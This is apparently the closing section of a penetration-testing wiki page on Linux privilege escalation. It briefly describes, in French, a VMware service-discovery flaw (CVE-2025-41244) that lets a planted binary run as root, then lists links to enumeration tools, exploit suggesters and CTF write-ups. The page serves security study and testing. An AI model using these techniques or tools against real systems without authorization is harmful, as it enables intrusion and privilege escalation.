La découverte de services pilotée par des regex dans VMware Tools/Aria Operations peut extraire un chemin de binaire depuis les lignes de commande des processus et l’exécuter avec -v dans un contexte privilégié. Des motifs permissifs (par ex., en utilisant \S) peuvent correspondre à des listeners mis en place par l’attaquant dans des emplacements inscriptibles (par ex., /tmp/httpd), conduisant à une exécution en tant que root (CWE-426 Untrusted Search Path).

En savoir plus et voir un modèle généralisé applicable à d’autres stacks de découverte/surveillance ici :

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Énumère les vulnérabilités du kernel sous Linux et Mac [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../banners/hacktricks-training.md}}
